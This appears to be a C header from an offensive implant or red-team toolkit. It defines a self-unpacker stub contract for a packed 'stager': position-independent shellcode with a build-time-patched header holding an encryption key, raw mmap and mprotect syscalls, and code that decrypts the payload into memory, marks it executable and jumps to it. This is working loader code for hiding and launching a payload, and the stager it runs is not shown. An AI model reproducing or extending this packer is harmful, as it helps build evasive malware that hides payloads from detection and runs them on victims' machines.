#ifndef UNPACK_H
#define UNPACK_H

#include <stddef.h>
#include <stdint.h>

/*
 * Self-unpacker stub contract (pluggable, mirrors the transport interface).
 *
 * A packed stager is laid out as:
 *
 *   [stub .init: _start][stub .text][stub .unpack_header: header][packed payload]
 *
 * `_start` (extracted first, sitting at offset 0 of the packed blob) calls
 * the stub's unpack_and_run(), which transforms the packed payload back into
 * the original stager and jumps to it.
 *
 * The header is patched at build time by the matching packer (pack_<name>.py)
 * and read by the stub at runtime:
 *   unpacked_size: payload size after unpacking.
 *   packed_size:   packed payload size (bytes after the header).
 *   key:           unpacker-specific material (e.g. RC4 key); zero if unused.
 *
 * To add an unpacker:
 *   1. Implement unpack_stub_<name>.c: define your unpacker-specific payload
 *      transformation function and pass it to unpack_run_stub() in
 *      unpack_and_run(), then call UNPACK_ENTRY() (see unpack_stub_rc4.c).
 *   2. Implement pack_<name>.py: transform stager.bin using helpers from
 *      pack_common.py (see pack_rc4.py).
 *   3. Select it with `make packed UNPACKER=<name>`.
 */

struct unpack_header {
  uint32_t unpacked_size;
  uint32_t packed_size;
  uint8_t key[16];
};

/*
 * Emit the build-time-patched header in a dedicated read-only section.
 *
 * A top-level asm statement is used instead of a C object for two reasons:
 *   1. the section stays read-only, so the stub links as a single RX segment
 *      and never needs a writable (RWX) LOAD segment; and
 *   2. GCC cannot constant-fold the placeholder values, which the packer
 *      overwrites in the flat blob after linking.
 * The placeholder fields (unpacked_size, packed_size, key) are in the order
 * of struct unpack_header; unpack_stub.ld places the section last so that
 * `h + 1` points at the packed payload appended after the stub.
 */
#define UNPACK_HEADER()                                                        \
  __asm__(".section .unpack_header,\"a\",@progbits\n"                          \
          ".p2align 3\n"                                                       \
          ".globl unpack_header\n"                                             \
          ".hidden unpack_header\n"                                            \
          "unpack_header:\n"                                                   \
          "  .long 1\n"                                                        \
          "  .long 1\n"                                                        \
          "  .zero 16\n"                                                       \
          "  .size unpack_header, 24\n"                                        \
          ".previous")

/* Hidden visibility makes GCC emit a PC-relative reference (`lea sym(%rip)`)
 * instead of a GOT load that the linker would relax to an absolute address.
 * The stub is position-independent shellcode loaded at an arbitrary base. */
extern struct unpack_header unpack_header
    __attribute__((visibility("hidden")));

/* Minimal mmap (SYS_mmap = 9). One raw syscall per stub; the unpacked stager
 * resolves the vDSO gadget for all of its own syscalls afterwards. */
static inline long unpack_mmap(void *addr, size_t len, long prot, long flags,
                               long fd, long off) {
  long ret;
  register long r10 __asm__("r10") = flags;
  register long r8 __asm__("r8") = fd;
  register long r9 __asm__("r9") = off;
  __asm__ __volatile__("syscall"
                       : "=a"(ret)
                       : "a"(9), "D"(addr), "S"(len), "d"(prot), "r"(r10),
                         "r"(r8), "r"(r9)
                       : "rcx", "r11", "memory");
  return ret;
}

/* Minimal mprotect (SYS_mprotect = 10). Used to flip the unpacked payload
 * from RW to RX before jumping to it. */
static inline long unpack_mprotect(void *addr, size_t len, long prot) {
  long ret;
  __asm__ __volatile__("syscall"
                       : "=a"(ret)
                       : "a"(10), "D"(addr), "S"(len), "d"(prot)
                       : "rcx", "r11", "memory");
  return ret;
}

/* Emit the entry point in .init (offset 0 of the packed blob). Calls the
 * stub's unpack_and_run() and traps if it ever returns. */
#define UNPACK_ENTRY()                                                         \
  __asm__(".section .init,\"ax\",@progbits\n"                                  \
          ".global _start\n"                                                   \
          "_start:\n"                                                          \
          "xor %rbp, %rbp\n"                                                   \
          "and $0xfffffffffffffff0, %rsp\n"                                    \
          "call unpack_and_run\n"                                              \
          "ud2\n")

/* Shared entry logic for all self-unpackers.
 * Allocates read/write memory via unpack_mmap, invokes the unpacker-specific
 * payload transformation callback, flips the result to read/execute, and
 * jumps to the unpacked entry point. The unpacked stager manages its own
 * writable state (see state.h), so the payload never needs to be RWX. */
__attribute__((noreturn)) static inline void unpack_run_stub(
    const struct unpack_header *h,
    void (*unpack_func)(const uint8_t *src, const struct unpack_header *hdr,
                        uint8_t *dst)) {
  const uint8_t *src = (const uint8_t *)(h + 1);
  long addr = unpack_mmap(0, h->unpacked_size, 3 /* RW */,
                          0x22 /* MAP_PRIVATE|MAP_ANONYMOUS */, -1, 0);
  if (addr < 0)
    __builtin_trap();

  unpack_func(src, h, (uint8_t *)addr);

  /* W^X: make the unpacked stager read-only + executable before jumping. */
  if (unpack_mprotect((void *)addr, h->unpacked_size, 5 /* RX */) != 0)
    __builtin_trap();

  ((void (*)(void))addr)(); /* original stager _start */
  __builtin_trap();
}

#endif /* UNPACK_H */
